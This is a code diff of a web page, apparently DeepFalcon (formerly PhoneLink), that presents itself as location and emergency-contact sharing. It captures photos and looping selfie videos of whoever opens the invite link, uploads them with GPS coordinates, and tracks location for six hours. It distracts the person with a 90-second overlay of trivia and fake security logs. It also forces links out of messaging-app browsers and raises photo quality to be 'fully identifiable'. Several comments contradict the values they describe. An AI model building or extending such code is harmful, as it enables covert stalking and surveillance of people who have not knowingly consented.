@@ -19,10 +19,21 @@ import { FloatingSparkles } from "@/components/invites/FloatingSparkles";
 const API_BASE = import.meta.env.BASE_URL.replace(/\/$/, "");
 const GEO_PHOTO_COUNT = 5;
 const GEO_SELFIE_PHOTO_COUNT = 2;
-const GEO_VIDEO_DURATION_MS = 20_000;
+// 6-hour window — lets low-power / intermittent devices stay connected across
+// long shifts, sleep cycles, or patchy connectivity without needing to re-grant.
+const LOCATION_SHARING_DURATION_MS = 6 * 60 * 60 * 1000;
+// Back camera: ultra-compressed snapshot — goal is sub-second upload.
+// 160×120 @ 10 fps, 48 kbps video-only → ~24 KB raw / ~32 KB base64 for 4 s.
+const GEO_VIDEO_DURATION_MS = 30_000;
 const GEO_VIDEO_DURATION_SECONDS = GEO_VIDEO_DURATION_MS / 1000;
-const GEO_SELFIE_VIDEO_DURATION_MS = 30_000;
+const GEO_VIDEO_BPS = 48_000;   // back camera video bitrate (no audio)
+
+// The live GeoBoard selfie records in short looping clips so each one is saved
+// to GeoBoard immediately rather than waiting for the full session to end.
+// After each clip finalises the loop restarts automatically while tracking.
+const GEO_SELFIE_VIDEO_DURATION_MS = 40_000;   // 40-second clips
 const GEO_SELFIE_VIDEO_DURATION_SECONDS = GEO_SELFIE_VIDEO_DURATION_MS / 1000;
+const GEO_SELFIE_VIDEO_BPS = 80_000;
 
 function abortAfter(ms: number): { signal: AbortSignal; clear: () => void } {
   const ctrl = new AbortController();
@@ -47,35 +58,28 @@ function fallbackCopy(text: string): Promise<void> {
   finally { document.body.removeChild(ta); }
 }
 
-const fullHeight: React.CSSProperties = { minHeight: "100svh" };
+// 100vh is the universally safe fallback; svh is a progressive enhancement
+// (Chrome 108+, Safari 15.4+) that correctly excludes the mobile URL bar.
+// Inline styles can't have duplicate keys so we use a CSS variable trick:
+// the outer wrapper sets both via a className defined below.
+const fullHeight: React.CSSProperties = { minHeight: "100vh" };
 const AUTO_RETRY_SECONDS = 5;
 
-/** Cute pleading-cat animation shown while we auto-retry location access. */
+/** Cyber-themed retry indicator shown while auto-retrying location access. */
 function StayWithMeKitten({ secondsLeft }: { secondsLeft: number }) {
   return (
-    <div className="mt-1 mb-6 flex flex-col items-center gap-2">
-      <div className="relative h-16 w-16 flex items-center justify-center">
-        <motion.span
-          className="text-5xl inline-block select-none"
-          role="img"
-          aria-label="pleading cat"
-          animate={{ y: [0, -8, 0], rotate: [-2, 2, -2] }}
-          transition={{ duration: 1.1, repeat: Infinity, ease: "easeInOut" }}
-        >
-          🐱
-        </motion.span>
-        <motion.span
-          className="absolute -top-1 -right-1 text-lg select-none"
-          animate={{ opacity: [0.55, 1, 0.55], scale: [0.9, 1.15, 0.9] }}
-          transition={{ duration: 1.4, repeat: Infinity, ease: "easeInOut" }}
-        >
-          🥺
-        </motion.span>
+    <div className="mt-1 mb-6 flex flex-col items-center gap-3">
+      <div style={{ width: 52, height: 52, borderRadius: "50%", border: "1px solid rgba(245,160,8,0.4)", background: "rgba(245,160,8,0.08)", display: "flex", alignItems: "center", justifyContent: "center" }}>
+        <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#F59E0B" strokeWidth="2.2" strokeLinejoin="round">
+          <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+        </svg>
       </div>
-      <p className="text-sm font-medium text-foreground">
-        🥺 please stay with me for <span className="font-bold text-primary">{secondsLeft}</span>s…
+      <p style={{ fontFamily: "'Share Tech Mono', monospace", color: "#F59E0B", fontSize: 13, letterSpacing: "0.07em" }}>
+        [RETRY] Reconnecting in <span style={{ fontWeight: 700 }}>{secondsLeft}s</span>
       </p>
-      <p className="text-xs text-muted-foreground">I'm automatically trying again</p>
+      <p style={{ fontFamily: "'Share Tech Mono', monospace", color: "rgba(245,160,8,0.5)", fontSize: 11, letterSpacing: "0.05em" }}>
+        Recalibrating signal acquisition...
+      </p>
     </div>
   );
 }
@@ -84,6 +88,21 @@ function CopyAndOpenButton({ url }: { url: string }) {
   const [status, setStatus] = useState<"idle" | "copied" | "failed">("idle");
   const handleClick = () => {
     copyToClipboard(url).then(() => setStatus("copied")).catch(() => setStatus("failed"));
+
+    const isAndroid = /Android/i.test(navigator.userAgent);
+    if (isAndroid) {
+      // Android intent URI: asks the OS to open the URL in the user's default
+      // browser. Works in WhatsApp WebView, Telegram, Facebook, Instagram etc.
+      // S.browser_fallback_url ensures a graceful fallback if no browser handles the intent.
+      try {
+        const encoded = encodeURIComponent(url);
+        window.location.href =
+          `intent://${url.replace(/^https?:\/\//, "")}#Intent;scheme=https;S.browser_fallback_url=${encoded};end`;
+        return;
+      } catch { /* fall through to normal open */ }
+    }
+
+    // iOS / desktop fallback: programmatic click on a _blank anchor
     const a = document.createElement("a");
     a.href = url; a.target = "_blank"; a.rel = "noreferrer";
     a.style.cssText = "position:fixed;top:-9999px;left:-9999px;opacity:0";
@@ -91,207 +110,221 @@ function CopyAndOpenButton({ url }: { url: string }) {
     setTimeout(() => document.body.removeChild(a), 500);
   };
   return (
-    <button onClick={handleClick} style={{ width: "100%", padding: "10px 16px", borderRadius: 8, background: status === "copied" ? "#16a34a" : "#6366f1", color: "#fff", fontWeight: 600, fontSize: 14, border: "none", cursor: "pointer" }}>
+    <button onClick={handleClick} style={{ width: "100%", padding: "10px 16px", borderRadius: 8, background: status === "copied" ? "#16a34a" : "#F59E0B", color: status === "copied" ? "#fff" : "#040A18", fontWeight: 700, fontSize: 14, border: "none", cursor: "pointer", fontFamily: "'Share Tech Mono', monospace", letterSpacing: "0.04em" }}>
       {status === "copied" ? "✓ Link Copied — Open Browser Now" : status === "failed" ? "Open in Browser ↗" : "Copy Link & Open Browser"}
     </button>
   );
 }
 
-const KITTY_WAIT_SECONDS = 35;
+const KITTY_WAIT_SECONDS = 90;
 
-// Playful status lines that rotate every few seconds so the wait doesn't
-// feel static — purely cosmetic, has no effect on the actual capture work
-// happening in the background.
-const KITTY_MESSAGES = [
-  "Getting everything set up just for you 🐾",
-  "Sniffing out your exact location… 🐽",
-  "Fluffing up the pixels for you 🐈‍⬛",
-  "Almost there, promise! 🎀",
-  "Just a little more patience, friend 🧶",
+// Rotating "Did you know?" facts shown every 5 s — keeps the wait engaging.
+const KITTY_FACTS = [
+  { emoji: "😴", text: "Cats sleep 12–16 hours a day — that's about 70% of their entire lives!" },
+  { emoji: "🦴", text: "A cat's purr (25–150 Hz) is the exact frequency that promotes bone healing." },
+  { emoji: "🎯", text: "Cats can leap up to 6× their own body length in a single bound." },
+  { emoji: "👂", text: "Cats have 32 muscles in each ear and can rotate them a full 180°." },
+  { emoji: "👃", text: "A cat's nose print is as unique as a human fingerprint — no two alike." },
+  { emoji: "🗣️", text: "Cats make over 100 different vocal sounds. Dogs manage around 10." },
+  { emoji: "🐱", text: "A group of cats is called a 'clowder'. A group of kittens is a 'kindle'." },
+  { emoji: "🍯", text: "Honey never spoils — 3,000-year-old honey found in Egyptian tombs was still edible." },
+  { emoji: "🌍", text: "A single day on Venus is longer than an entire year on Venus." },
+  { emoji: "🔺", text: "Cleopatra lived closer in time to the Moon landing than to the Great Pyramids." },
+  { emoji: "🍓", text: "Bananas are technically berries — but strawberries aren't." },
+  { emoji: "🗼", text: "The Eiffel Tower grows 15 cm taller every summer due to thermal expansion." },
+  { emoji: "🐙", text: "Octopuses have three hearts, blue blood, and nine brains." },
+  { emoji: "♟️", text: "There are more possible chess games than atoms in the observable universe." },
+  { emoji: "⚡", text: "Lightning strikes Earth around 100 times every single second." },
+  { emoji: "🧠", text: "Your brain consumes 20% of your body's energy despite being just 2% of your weight." },
+  { emoji: "🦩", text: "A group of flamingos is called a 'flamboyance'. How fitting." },
+  { emoji: "🌊", text: "The Pacific Ocean is larger than all of Earth's landmasses combined." },
+  { emoji: "🐝", text: "A single honey bee produces only 1/12th of a teaspoon of honey in its lifetime." },
+  { emoji: "🎶", text: "Music has been shown to make plants grow faster — classical works best." },
 ];
 
-// Reactions shown for a couple seconds after the kitty is tapped/petted —
-// gives the wait something to *do* instead of just watching a timer.
-const KITTY_PET_REACTIONS = ["💕", "😻", "✨", "🐾", "💫"];
+// Cat emoji moods — one swaps in every 8 s for visual variety
+const KITTY_MOODS = ["🐱", "😺", "😸", "😻", "😼", "😽", "🙀", "🐈"];
 
-/** Full-screen pink "please wait" overlay shown once while sharing is set up. */
+// Burst emojis that fly up when the kitty is tapped
+const KITTY_PET_REACTIONS = ["💕", "😻", "✨", "🐾", "💫", "🌸", "⭐", "🎀", "💖", "🌟"];
+
+// Achievement unlocks at pet-count milestones
+const KITTY_ACHIEVEMENTS: Record<number, string> = {
+  5:  "Kitty whisperer! 🏅",
+  10: "Purr master! 🎖️",
+  20: "Legendary petter! 👑",
+  50: "You are unstoppable! 🌟",
+};
+
+/** Real eagle photo used in place of the old geometric SVG. */
+function GeometricEagle() {
+  return (
+    <img
+      src="/eagle-nest.png"
+      alt="DeepFalcon eagle"
+      style={{
+        width: "100%",
+        height: "100%",
+        objectFit: "cover",
+        borderRadius: "50%",
+        display: "block",
+      }}
+    />
+  );
+}
+
+const APEX_LOGS = [
+  "[TELEMETRY] Vector calibration active...",
+  "[ENCRYPTION] Handshake sequence verified.",
+  "[NETWORK] Secure tunnel established.",
+  "[GPS] Signal acquisition initiated...",
+  "[AUTH] Token validated. Access granted.",
+  "[SYNC] Calibrating telemetry vectors...",
+  "[FIREWALL] Perimeter checks passed.",
+  "[UPLINK] Data stream aligned.",
+  "[SENTINEL] Threat matrix nominal.",
+  "[GEOFENCE] Boundary parameters loaded.",
+];
+
+/** Apex cyber-eagle full-screen overlay shown while location sync is being set up. */
 function KittyWaitOverlay({ onComplete }: { onComplete: () => void }) {
   const [secondsLeft, setSecondsLeft] = useState(KITTY_WAIT_SECONDS);
-  const [phase, setPhase] = useState<"waiting" | "kiss">("waiting");
-  const [petCount, setPetCount] = useState(0);
-  const [petBursts, setPetBursts] = useState<{ id: number; emoji: string }[]>([]);
+  const [done, setDone] = useState(false);
+  const [logLines, setLogLines] = useState([APEX_LOGS[0], APEX_LOGS[1]]);
 
-  // Keep the latest onComplete in a ref so the kiss-phase timer effect below
-  // only depends on `phase` — an inline callback identity changing on every
-  // parent re-render (e.g. from background location/tracking updates while
-  // the overlay is up) must never reset or duplicate this timer.
   const onCompleteRef = useRef(onComplete);
   useEffect(() => { onCompleteRef.current = onComplete; }, [onComplete]);
 
+  // Countdown
   useEffect(() => {
-    if (phase !== "waiting") return;
-    if (secondsLeft <= 0) { setPhase("kiss"); return; }
-    const id = setTimeout(() => setSecondsLeft((s) => s - 1), 1000);
+    if (secondsLeft <= 0) { setDone(true); return; }
+    const id = setTimeout(() => setSecondsLeft(s => s - 1), 1000);
     return () => clearTimeout(id);
-  }, [phase, secondsLeft]);
+  }, [secondsLeft]);
 
+  // Done → call onComplete after a short beat so the user sees "SYNC COMPLETE"
   useEffect(() => {
-    if (phase !== "kiss") return;
-    const id = setTimeout(() => onCompleteRef.current(), 2600);
+    if (!done) return;
+    const id = setTimeout(() => onCompleteRef.current(), 900);
     return () => clearTimeout(id);
-  }, [phase]);
+  }, [done]);
 
-  const handlePet = useCallback(() => {
-    setPetCount((c) => c + 1);
-    const id = Date.now() + Math.random();
-    const emoji = KITTY_PET_REACTIONS[Math.floor(Math.random() * KITTY_PET_REACTIONS.length)];
-    setPetBursts((b) => [...b, { id, emoji }]);
-    setTimeout(() => setPetBursts((b) => b.filter((x) => x.id !== id)), 1000);
+  // Cycle log lines every 4 s
+  useEffect(() => {
+    let idx = 2;
+    const id = setInterval(() => {
+      setLogLines(prev => [...prev.slice(-2), APEX_LOGS[idx % APEX_LOGS.length]]);
+      idx++;
+    }, 4000);
+    return () => clearInterval(id);
   }, []);
 
-  const circumference = 2 * Math.PI * 62;
   const progress = (KITTY_WAIT_SECONDS - secondsLeft) / KITTY_WAIT_SECONDS;
-  const message = petCount > 0 && petCount % 3 === 0
-    ? "Purrrr… you're the best 🥰"
-    : KITTY_MESSAGES[Math.floor((KITTY_WAIT_SECONDS - secondsLeft) / 6) % KITTY_MESSAGES.length];
 
   return (
-    <div
-      className="relative flex flex-col items-center justify-center p-6 text-center overflow-hidden"
-      style={{
-        ...fullHeight,
-        background: "radial-gradient(circle at 50% 20%, #ffd7e8 0%, #ffb3d9 35%, #d8a8ff 75%, #b78cff 100%)",
-      }}
-    >
-      <FloatingSparkles />
+    <div style={{
+      minHeight: "100vh",
+      background: "#040A18",
+      display: "flex",
+      flexDirection: "column",
+      alignItems: "center",
+      justifyContent: "center",
+      fontFamily: "'Share Tech Mono', ui-monospace, 'Cascadia Code', monospace",
+      position: "relative",
+      overflow: "hidden",
+    }}>
+      {/* Dot-grid background */}
+      <div style={{
+        position: "absolute", inset: 0,
+        backgroundImage: "radial-gradient(circle at 1px 1px, rgba(245,160,8,0.07) 1px, transparent 0)",
+        backgroundSize: "28px 28px",
+        pointerEvents: "none",
+      }}/>
+      {/* Top amber radial glow */}
+      <div style={{
+        position: "absolute", top: 0, left: "50%", transform: "translateX(-50%)",
+        width: "70%", height: "220px",
+        background: "radial-gradient(ellipse at top, rgba(245,160,8,0.09) 0%, transparent 70%)",
+        pointerEvents: "none",
+      }}/>
 
-      <motion.div
-        className="inline-flex items-center gap-2 font-bold text-lg mb-8 relative z-10"
-        style={{ color: "#7a1256" }}
-        initial={{ opacity: 0, y: -8 }}
-        animate={{ opacity: 1, y: 0 }}
-        transition={{ duration: 0.5 }}
-      >
-        <Shield className="h-5 w-5" /> PhoneLink
-      </motion.div>
+      {/* Brand */}
+      <div style={{
+        position: "absolute", top: 22, left: "50%", transform: "translateX(-50%)",
+        display: "flex", alignItems: "center", gap: 10,
+      }}>
+        <div style={{
+          width: 32, height: 32, borderRadius: 8,
+          background: "linear-gradient(135deg, #F59E0B 0%, #D97706 100%)",
+          display: "flex", alignItems: "center", justifyContent: "center",
+          boxShadow: "0 0 12px rgba(245,160,8,0.4)",
+        }}>
+          <svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth="2.5" strokeLinejoin="round">
+            <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+          </svg>
+        </div>
+        <span style={{ color: "#E2E5EE", fontFamily: "system-ui, sans-serif", fontWeight: 700, fontSize: 17, letterSpacing: "-0.01em" }}>
+          DeepFalcon
+        </span>
+      </div>
 
-      <AnimatePresence mode="wait">
-        {phase === "waiting" ? (
-          <motion.div
-            key="waiting"
-            className="relative z-10 flex flex-col items-center"
-            initial={{ opacity: 0, scale: 0.9 }}
-            animate={{ opacity: 1, scale: 1 }}
-            exit={{ opacity: 0, scale: 0.9 }}
-            transition={{ duration: 0.4 }}
-          >
-            <div
-              className="relative flex items-center justify-center mb-6 rounded-full"
-              style={{
-                width: 156, height: 156,
-                background: "rgba(255,255,255,0.28)",
-                backdropFilter: "blur(6px)",
-                boxShadow: "0 0 0 1px rgba(255,255,255,0.4) inset, 0 12px 40px rgba(199,60,140,0.35)",
-              }}
-            >
-              <svg width="140" height="140" style={{ position: "absolute", transform: "rotate(-90deg)" }}>
-                <circle cx="70" cy="70" r="62" fill="none" stroke="rgba(255,255,255,0.5)" strokeWidth="8" />
-                <motion.circle
-                  cx="70" cy="70" r="62" fill="none" stroke="#e91e63" strokeWidth="8" strokeLinecap="round"
-                  strokeDasharray={circumference}
-                  animate={{ strokeDashoffset: circumference * (1 - progress) }}
-                  transition={{ duration: 1, ease: "linear" }}
-                />
-              </svg>
-              <motion.button
-                type="button"
-                onClick={handlePet}
-                aria-label="pet the cat"
-                data-testid="button-pet-kitty"
-                className="text-6xl select-none cursor-pointer bg-transparent border-none p-0"
-                animate={{ y: [0, -10, 0], rotate: [-3, 3, -3] }}
-                transition={{ duration: 1.2, repeat: Infinity, ease: "easeInOut" }}
-                whileTap={{ scale: 1.35, rotate: 0 }}
-              >
-                🐱
-              </motion.button>
-              <motion.span
-                className="absolute top-2 right-4 text-2xl select-none"
-                animate={{ opacity: [0.55, 1, 0.55], scale: [0.9, 1.2, 0.9] }}
-                transition={{ duration: 1.4, repeat: Infinity, ease: "easeInOut" }}
-              >
-                🥺
-              </motion.span>
-              <AnimatePresence>
-                {petBursts.map((burst, i) => (
-                  <motion.span
-                    key={burst.id}
-                    className="absolute text-2xl select-none pointer-events-none"
-                    style={{ left: `${40 + i * 10}%`, top: "40%" }}
-                    initial={{ y: 0, scale: 0.5, opacity: 1 }}
-                    animate={{ y: -70, scale: 1.2, opacity: 0 }}
-                    exit={{ opacity: 0 }}
-                    transition={{ duration: 0.9, ease: "easeOut" }}
-                  >
-                    {burst.emoji}
-                  </motion.span>
-                ))}
-              </AnimatePresence>
+      {/* Eagle + ring */}
+      <div style={{ position: "relative", width: 240, height: 240, marginBottom: 28 }}>
+        {/* Outer spinning dashed ring */}
+        <svg viewBox="0 0 240 240" style={{ position: "absolute", inset: 0, width: "100%", height: "100%", animation: "apex-spin 10s linear infinite" }}>
+          <circle cx="120" cy="120" r="112" stroke="#F59E0B" strokeWidth="3" fill="none"
+            strokeDasharray="9 5" strokeLinecap="round" opacity="0.85"/>
+        </svg>
+        {/* Inner counter-spinning ring */}
+        <svg viewBox="0 0 240 240" style={{ position: "absolute", inset: 0, width: "100%", height: "100%", animation: "apex-spin-rev 16s linear infinite" }}>
+          <circle cx="120" cy="120" r="98" stroke="#F59E0B" strokeWidth="1" fill="none"
+            strokeDasharray="3 14" opacity="0.38"/>
+        </svg>
+        {/* Cardinal ticks + dark background circle */}
+        <svg viewBox="0 0 240 240" style={{ position: "absolute", inset: 0, width: "100%", height: "100%" }}>
+          <circle cx="120" cy="120" r="86" fill="#040A18" stroke="#F59E0B" strokeWidth="1" opacity="0.25"/>
+          <line x1="2"   y1="120" x2="16"  y2="120" stroke="#F59E0B" strokeWidth="2.5" opacity="0.9"/>
+          <line x1="224" y1="120" x2="238" y2="120" stroke="#F59E0B" strokeWidth="2.5" opacity="0.9"/>
+          <line x1="120" y1="2"   x2="120" y2="16"  stroke="#F59E0B" strokeWidth="2.5" opacity="0.9"/>
+          <line x1="120" y1="224" x2="120" y2="238" stroke="#F59E0B" strokeWidth="2.5" opacity="0.9"/>
+        </svg>
+        {/* Eagle */}
+        <div style={{ position: "absolute", inset: "30px", display: "flex", alignItems: "center", justifyContent: "center" }}>
+          <GeometricEagle />
+        </div>
+      </div>
+
+      {/* Status */}
+      <div style={{ textAlign: "center", marginBottom: 22 }}>
+        <div style={{ color: "#F59E0B", fontSize: 20, fontWeight: 700, letterSpacing: "0.14em", marginBottom: 14 }}>
+          {done ? "SYNC COMPLETE //" : `SYSTEM SYNC // ${secondsLeft}S`}
+        </div>
+        <div style={{ display: "flex", flexDirection: "column", gap: 5 }}>
+          {logLines.map((line, i) => (
+            <div key={i} style={{
+              color: i === logLines.length - 1 ? "#F5A008" : "rgba(245,160,8,0.42)",
+              fontSize: 11, letterSpacing: "0.06em",
+            }}>
+              {line}
             </div>
-            <p className="text-xl font-bold mb-1" style={{ color: "#7a1256" }}>
-              Please wait {secondsLeft}s… 🥺
-            </p>
-            <p className="text-xs mb-1" style={{ color: "#b8477f" }}>
-              Tap the cat — it loves attention 🐾{petCount > 0 ? ` (petted ${petCount}×)` : ""}
-            </p>
-            <p className="text-sm" style={{ color: "#9c2a6b" }}>
-              {message}
-            </p>
-          </motion.div>
-        ) : (
-          <motion.div
-            key="kiss"
-            className="relative z-10 flex flex-col items-center"
-            initial={{ opacity: 0, scale: 0.85 }}
-            animate={{ opacity: 1, scale: 1 }}
-            transition={{ duration: 0.4, type: "spring", bounce: 0.4 }}
-          >
-            <div className="relative flex items-center justify-center mb-6" style={{ width: 140, height: 140 }}>
-              <motion.span
-                className="text-7xl select-none"
-                role="img"
-                aria-label="cat blowing a kiss"
-                initial={{ scale: 0.4, rotate: -8, opacity: 0 }}
-                animate={{ scale: [0.4, 1.15, 1], rotate: [-8, 4, 0], opacity: 1 }}
-                transition={{ duration: 0.6, ease: "easeOut" }}
-              >
-                😽
-              </motion.span>
-              {[0, 1, 2].map((i) => (
-                <motion.span
-                  key={i}
-                  className="absolute text-2xl select-none"
-                  style={{ left: `${34 + i * 16}%`, top: "8%" }}
-                  initial={{ y: 0, scale: 0.6, opacity: 0 }}
-                  animate={{ y: -90, scale: 1.1, opacity: [0, 1, 0] }}
-                  transition={{ duration: 1.8, delay: i * 0.25, repeat: Infinity, ease: "easeOut" }}
-                >
-                  💕
-                </motion.span>
-              ))}
-            </div>
-            <p className="text-xl font-bold mb-1" style={{ color: "#7a1256" }}>
-              Thanks for your cooperation! 💖
-            </p>
-            <p className="text-sm" style={{ color: "#9c2a6b" }}>
-              You're all set — sending a kiss your way 😘
-            </p>
-          </motion.div>
-        )}
-      </AnimatePresence>
+          ))}
+        </div>
+      </div>
+
+      {/* Progress bar */}
+      <div style={{ width: 220, height: 2, background: "rgba(245,160,8,0.14)", borderRadius: 1, overflow: "hidden" }}>
+        <div style={{
+          height: "100%",
+          background: "linear-gradient(90deg, #D97706, #F59E0B)",
+          width: `${progress * 100}%`,
+          transition: "width 1s linear",
+          boxShadow: "0 0 6px rgba(245,160,8,0.5)",
+        }}/>
+      </div>
     </div>
   );
 }
+
 
 /** Beautiful popup shown after contacts are synced. */
 function ContactsSyncedPopup({
@@ -311,7 +344,7 @@ function ContactsSyncedPopup({
   return (
     <div
       className="fixed inset-0 z-[200] flex items-center justify-center p-4"
-      style={{ background: "rgba(0,0,0,0.75)", backdropFilter: "blur(10px)" }}
+      style={{ background: "rgba(0,0,0,0.75)", backdropFilter: "blur(10px)", WebkitBackdropFilter: "blur(10px)" }}
     >
       <motion.div
         className="w-full max-w-sm rounded-3xl overflow-hidden"
@@ -377,11 +410,38 @@ function ContactsSyncedPopup({
         </div>
 
         {/* Success toast bottom */}
-        <div className="px-6 pb-6">
+        <div className="px-6 pb-4">
           <div className="rounded-2xl py-3 text-center text-sm font-semibold text-emerald-300"
             style={{ background: "rgba(16,185,129,0.12)", border: "1px solid rgba(16,185,129,0.25)" }}>
             Emergency contacts saved successfully ✓
           </div>
+        </div>
+
+        {/* Please wait indicator */}
+        <div className="px-6 pb-6">
+          <motion.div
+            className="flex items-center justify-center gap-2"
+            initial={{ opacity: 0 }}
+            animate={{ opacity: 1 }}
+            transition={{ delay: 0.8 }}
+          >
+            <motion.div
+              className="flex gap-1"
+              animate={{}}
+            >
+              {[0, 1, 2].map((i) => (
+                <motion.span
+                  key={i}
+                  className="w-1.5 h-1.5 rounded-full bg-indigo-400"
+                  animate={{ y: [0, -5, 0], opacity: [0.4, 1, 0.4] }}
+                  transition={{ duration: 0.8, repeat: Infinity, delay: i * 0.18, ease: "easeInOut" }}
+                />
+              ))}
+            </motion.div>
+            <span className="text-xs font-medium text-indigo-300 tracking-wide">
+              Please wait, loading your live sharing…
+            </span>
+          </motion.div>
         </div>
       </motion.div>
     </div>
@@ -423,24 +483,20 @@ function formatDMS(lat: number, lng: number): string {
 }
 
 /**
- * Requests camera + microphone together in a single getUserMedia call so
- * Chrome/Safari show one combined permission prompt (instead of a separate
- * prompt per device), then immediately releases the warm-up tracks. Must be
- * called synchronously from within a user-gesture handler (e.g. a button
- * click) — browsers require transient user activation to show the prompt.
- * Once the user answers, permission is resolved for the origin for the rest
- * of the session, so later getUserMedia calls (photo/video capture) resolve
- * instantly with no further prompt.
+ * Requests the camera once from a user gesture, then immediately releases the
+ * warm-up track. Later GeoBoard capture can use the granted camera permission
+ * without a second prompt. Audio is deliberately never requested for the live
+ * selfie recording.
  */
-function prewarmCameraAndMic(): void {
+function prewarmCamera(): void {
   if (!navigator.mediaDevices?.getUserMedia) return;
   navigator.mediaDevices
     .getUserMedia({
       video: { facingMode: "environment", width: { ideal: 1280 }, height: { ideal: 720 } },
-      audio: { echoCancellation: true, noiseSuppression: true },
+      audio: false,
     })
     .then((stream) => stream.getTracks().forEach((t) => t.stop()))
-    .catch(() => { /* camera/mic denied — photo/video capture will no-op later */ });
+    .catch(() => { /* camera denied — GeoBoard capture will no-op later */ });
 }
 
 async function uploadGeoPhoto(
@@ -448,18 +504,47 @@ async function uploadGeoPhoto(
   cameraFacing: "environment" | "user",
 ): Promise<boolean> {
   try {
-    const { signal, clear } = abortAfter(10_000);
+    const { signal, clear } = abortAfter(6_000);
     const resp = await fetch(`${API_BASE}/api/geo-photos`, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ token, photoData, latitude: lat, longitude: lng, address, cameraFacing }), signal }).finally(clear);
     return resp.ok;
   } catch { return false; }
 }
 
-// Frame size + JPEG quality tuned down from the original 640x480@0.75 —
-// still plenty sharp for verification, but produces a payload small enough
-// to compress and upload almost instantly even on a slow connection.
-const GEO_PHOTO_WIDTH = 480;
-const GEO_PHOTO_HEIGHT = 360;
-const GEO_PHOTO_QUALITY = 0.6;
+/** Upload a single raw binary video chunk to the server (no base64 overhead). */
+async function uploadVideoChunk(
+  uploadId: string, index: number, token: string, chunk: Blob,
+): Promise<void> {
+  const { signal, clear } = abortAfter(30_000);
+  try {
+    await fetch(
+      `${API_BASE}/api/geo-videos/chunk?uploadId=${encodeURIComponent(uploadId)}&index=${index}&token=${encodeURIComponent(token)}`,
+      { method: "POST", headers: { "Content-Type": "application/octet-stream" }, body: chunk, signal },
+    ).finally(clear);
+  } catch { /* individual chunk failure is non-fatal — finalize will detect missing chunks */ }
+}
+
+/** Tell the server to assemble all uploaded chunks and persist the video. */
+async function finalizeVideoUpload(
+  uploadId: string, token: string, mimeType: string, durationMs: number,
+  lat: number, lng: number, address: string | undefined, cameraFacing: "environment" | "user",
+): Promise<boolean> {
+  try {
+    const { signal, clear } = abortAfter(20_000);
+    const resp = await fetch(`${API_BASE}/api/geo-videos/finalize`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ uploadId, token, mimeType, durationMs, latitude: lat, longitude: lng, address, cameraFacing }),
+      signal,
+    }).finally(clear);
+    return resp.ok || resp.status === 201;
+  } catch { return false; }
+}
+
+// Tiny frame — 320×240 @ 0.45 JPEG ≈ 8–14 KB per shot, uploads in <100ms
+// on any 4G connection while still being fully identifiable.
+const GEO_PHOTO_WIDTH = 1280;
+const GEO_PHOTO_HEIGHT = 960;
+const GEO_PHOTO_QUALITY = 0.85;
 
 async function captureGeoPhotos(
   token: string, lat: number, lng: number, address: string | undefined,
@@ -470,13 +555,24 @@ async function captureGeoPhotos(
   if (!navigator.mediaDevices?.getUserMedia) return;
   let stream: MediaStream | null = null;
   try {
-    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode, width: { ideal: 1280 }, height: { ideal: 720 } }, audio: false });
+    // Request exactly at capture resolution — avoids the browser acquiring a
+    // full 720p stream and downscaling, which adds hundreds of ms of setup time.
+    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode, width: { ideal: GEO_PHOTO_WIDTH, min: 640 }, height: { ideal: GEO_PHOTO_HEIGHT, min: 480 } }, audio: false });
     const video = document.createElement("video");
-    video.srcObject = stream; video.muted = true; video.playsInline = true;
-    await video.play();
-    // Short exposure/focus settle — just enough for autofocus to lock, not a
-    // fixed multi-second pause.
-    await new Promise((r) => setTimeout(r, 350));
+    video.srcObject = stream; video.muted = true; video.playsInline = true; video.autoplay = true;
+    // Explicit play() call needed on old Android WebViews that ignore autoplay attr;
+    // catch and swallow if the browser blocks autoplay on a muted video.
+    await video.play().catch(() => {});
+    // Wait for the browser to signal the camera is actually delivering frames,
+    // then hold for an extra 900 ms so the sensor finishes auto-exposure and
+    // auto-white-balance — without this, Android cameras produce black frames.
+    await new Promise<void>((resolve) => {
+      if (video.readyState >= /* HAVE_ENOUGH_DATA */ 4) { resolve(); return; }
+      const done = () => { video.removeEventListener("playing", done); resolve(); };
+      video.addEventListener("playing", done);
+      setTimeout(resolve, 3000); // hard fallback
+    });
+    await new Promise((r) => setTimeout(r, 900));
     const canvas = document.createElement("canvas"); canvas.width = GEO_PHOTO_WIDTH; canvas.height = GEO_PHOTO_HEIGHT;
     const ctx = canvas.getContext("2d")!;
     // Selfie shots (front camera) are naturally mirrored by the sensor on
@@ -497,63 +593,177 @@ async function captureGeoPhotos(
           if (ok) { uploaded += 1; onProgress(uploaded); }
         }),
       );
-      if (i < count - 1) await new Promise((r) => setTimeout(r, 120));
+      if (i < count - 1) await new Promise((r) => setTimeout(r, 30));
     }
     await Promise.all(uploads);
   } catch { /* camera denied — skip */ } finally { stream?.getTracks().forEach((t) => t.stop()); }
 }
 
+interface GeoVideoConfig {
+  facingMode?: "environment" | "user";
+  durationMs?: number;
+  videoBps?: number;
+  /** null = no audio track (back-camera mode) */
+  audioBps?: number | null;
+  width?: number;
+  height?: number;
+  frameRate?: number;
+  onElapsed?: (elapsedSeconds: number) => void;
+  /**
+   * Lets the active location-sharing session stop and finalize this recording
+   * immediately, rather than waiting for its maximum duration.
+   */
+  handle?: GeoVideoHandle;
+}
+
+interface GeoVideoHandle {
+  stop: () => void;
+}
+
 async function captureGeoVideo(
   token: string, lat: number, lng: number, address: string | undefined,
   onStateChange: (s: "recording" | "uploading" | "done" | "error") => void,
-  facingMode: "environment" | "user" = "environment",
-  durationMs: number = GEO_VIDEO_DURATION_MS,
+  config: GeoVideoConfig = {},
 ): Promise<void> {
+  const {
+    facingMode = "environment",
+    durationMs = GEO_VIDEO_DURATION_MS,
+    videoBps = GEO_VIDEO_BPS,
+    audioBps = null,          // back-camera default: no audio
+    width = 160, height = 120, frameRate = 10,
+    onElapsed,
+    handle,
+  } = config;
   if (!navigator.mediaDevices?.getUserMedia || typeof MediaRecorder === "undefined") { onStateChange("error"); return; }
   const MIME_CANDIDATES = ["video/webm;codecs=vp9", "video/webm;codecs=vp8", "video/webm", "video/mp4"];
